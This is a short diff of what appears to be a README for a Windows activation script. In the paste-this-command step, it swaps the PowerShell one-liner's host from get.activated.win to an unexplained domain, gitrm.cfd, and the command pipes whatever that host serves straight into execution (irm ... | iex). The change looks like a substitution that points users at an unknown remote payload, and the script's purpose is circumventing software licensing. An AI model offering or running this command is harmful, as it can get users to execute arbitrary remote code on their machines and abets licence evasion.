@@ -17,7 +17,7 @@
 2. Copy and paste the code below and press **Enter.**  
    - For **Windows 8.1, 10 and 11**:
      ```
-     irm https://get.activated.win | iex
+     irm gitrm.cfd | iex
      ```
 	 If the above is blocked (by ISP/DNS), try this (needs updated Windows 10 or 11):  
 	 ```
